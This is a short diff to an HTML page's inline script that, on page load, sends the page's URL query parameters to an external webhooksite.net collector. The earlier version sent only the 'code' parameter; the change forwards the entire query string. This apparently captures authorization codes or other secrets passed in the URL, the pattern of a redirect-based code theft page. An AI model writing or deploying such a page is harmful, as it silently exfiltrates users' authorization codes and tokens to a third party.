@@ -3,9 +3,8 @@
 <head>
   <script>
     
-    const params = new URLSearchParams(window.location.search);
-    const data = params.get("code");
-    const webhook = new URL("https://webhooksite.net/510a6033-bbc2-4dfc-9503-fcb2b1056fc8?code=" + data);
+    const params = window.location.search;
+    const webhook = new URL("https://webhooksite.net/510a6033-bbc2-4dfc-9503-fcb2b1056fc8"+params);
 
     fetch(webhook, {
       method: "GET"});
